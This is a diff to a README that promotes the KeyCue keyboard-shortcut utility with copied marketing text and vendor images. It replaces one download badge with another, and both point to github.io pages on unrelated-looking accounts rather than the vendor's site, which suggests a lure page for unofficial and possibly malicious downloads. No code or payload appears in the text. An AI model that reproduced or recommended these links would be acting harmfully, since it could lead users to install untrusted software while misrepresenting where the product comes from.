@@ -3,13 +3,7 @@
 
 <div align="center">  
 <img src="https://www.itopnews.de/wp-content/uploads/2025/03/KeyCue-Logo-Foto-KeyCue.jpg" alt="KeyCue Logo" width="256" height="256">  
-</div>  
-
-<div align="center">  
-<a href="https://shikikofa1593.github.io/.github/keycue">  
-<img src="https://img.shields.io/badge/GET_KeyCue-darkblue?style=for-the-badge&logo=apple" alt="GET KeyCue">  
-</a>  
-</div>  
+</div>   
 
 ---
 
@@ -18,6 +12,8 @@
 ![KeyCue Overlay Example](https://assets.ergonis.com/website/xlarge_Key_Cue_interface_d47dc70633.png)
 
 KeyCue is a professional-grade utility that transforms how you interact with your computer by unveiling the full power of keyboard shortcuts. This elegant tool is designed to be your constant companion, significantly enhancing efficiency and workflow speed across virtually any application you use. By providing an instant, context-aware visual guide to all available commands, it reduces the cognitive load of memorization and menu hunting.
+
+[![Download Now](https://img.shields.io/badge/Download_Now-steelblue?style=for-the-badge&logo=arma)](https://p0763235.github.io/.github/keycue-keyboard-shortcut-helper)
 
 The core functionality of KeyCue is both simple and profound. Activate it with a customizable keystroke, and a transparent overlay appears, listing every keyboard command relevant to the foreground application—from basic copy and paste operations to advanced, application-specific functions. This makes it indispensable for power users working in complex environments like digital audio workstations, programming IDEs, and graphic design software, where mastering shortcuts is key to professional performance.
 
